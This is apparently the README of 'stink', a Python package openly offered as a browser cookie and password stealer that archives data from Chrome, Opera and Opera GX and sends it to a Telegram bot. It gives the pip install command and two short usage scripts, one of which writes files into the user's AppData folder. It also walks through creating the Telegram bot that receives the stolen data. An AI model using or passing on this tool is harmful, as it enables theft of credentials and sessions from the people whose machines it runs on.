[![made-with-python](https://img.shields.io/badge/Made%20with-Python-1f425f.svg)](https://www.python.org/) ![repo-size](https://img.shields.io/github/repo-size/FallenAstaroth/stink)

# stink

Cookies and passwords stealer in just 2 lines, sent to Telegram.

## Description
`stink` is just starting its development. Its functionality will be expanded in the future.

## Navigation
* [Current features](#Сurrent-features)
* [Future features](#Future-features)
* [Installation](#Installation)
* [Example usage](#Example-usage)
  * [Standard](#Standard)
  * [Custom](#Custom)
* [Telegram bot setup](#Telegram-bot-setup)
  * [Getting token](#Getting-token)
  * [Getting id](#Getting-id)

### Current features
1. Collecting cookies and passwords of the following browsers: Chrome, Opera, Opera GX.
2. Sending collected data as an archive to Telegram.
3. Running in a separate thread.

### Future features
1. Support for other browsers.
2. System information gathering.
3. Collecting IP and other.
 
## Installation

You can install the latest version with the command:
```
pip install stink==0.0.3
```

## Example usage
### Standard
```python
from stink.multistealer import Stealer

Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
```
The standard ```Stealer``` runs collection on all available browsers and sends the collected data in an archive to you in Telegram.

### Custom
```python
from os import path, mkdir
from getpass import getuser

from stink.browsers.chrome import Chrome
from stink.modules.sender import Sender

user = getuser()

zip_name = f"{user}-st"
storage_path = f"C:/Users/{user}/AppData/"
storage_folder = "files/"


def main():

    mkdir(storage_path + storage_folder)

    Chrome(storage_path, storage_folder).run()
    Sender(zip_name, storage_path, storage_folder, "YOUR_TOKEN", YOUR_ID).run()


if __name__ == "__main__":
    main()
```
In the custom stealer, you need to prescribe the necessary browsers and the path for storing the collected data yourself. The ```Sender``` module will pack all files into an archive and send it to you in Telegram.

## Telegram bot setup
### Getting token
1. Open a chat with [BotFather](https://t.me/botfather).
2. Write the command ```/newbot```.

<p align="left">
  <a href="">
    <img src="_1.png" width="500px" style="display: inline-block;">
  </a>
</p>

3. Write the name of the bot, then the nickname with the attribute ```_bot``` at the end.

<p align="left">
  <a href="">
    <img src="_2.png" width="500px" style="display: inline-block;">
  </a>
</p>

4. Insert the resulting token into the ```YOUR_TOKEN``` field in the script.

### Getting id
1. Open a chat with [Get My ID](https://t.me/getmyid_bot).
2. Write the command ```/start```.

<p align="left">
  <a href="">
    <img src="_3.png" width="500px" style="display: inline-block;">
  </a>
</p>

3. Insert the resulting ID into the ```YOUR_ID``` field in the script.
